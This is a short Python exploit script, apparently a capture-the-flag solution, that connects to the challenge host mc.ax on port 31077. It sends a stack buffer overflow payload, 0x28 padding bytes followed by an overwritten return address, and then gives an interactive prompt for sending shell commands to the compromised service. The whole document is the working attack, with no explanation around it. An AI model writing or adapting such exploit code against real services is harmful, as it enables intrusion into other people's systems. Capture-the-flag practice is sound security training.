#!/bin/python3
import sys
import socket
import threading
from time import sleep

payload = b'\x90' * 0x28 + b'\xf6\x11\x40\x00\x00\x00\x00\x00'

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('mc.ax', 31077))

def servermsg(msg):
  print(f"[server]: {msg}")
def clientmsg(msg):
  print(f"[client]: {msg}")

def thread_func():
  while 1:
    buf = s.recv(1024)
    if buf: servermsg(buf.decode("utf-8"))

threading.Thread(target=thread_func).start()

while 1:
  cmd = input("> ").strip()
  if cmd == "pwn":
    s.send(bytes(payload))
    clientmsg("pwn sent")
  elif cmd == "exit":
    clientmsg("bye")
    exit(0)
  elif cmd.startswith('!'):
    msg = cmd[1:]
    s.sendall((msg + "\n").encode('utf-8'))
    clientmsg(f"sent command `{msg}`")
  else:
    clientmsg("unknown command")


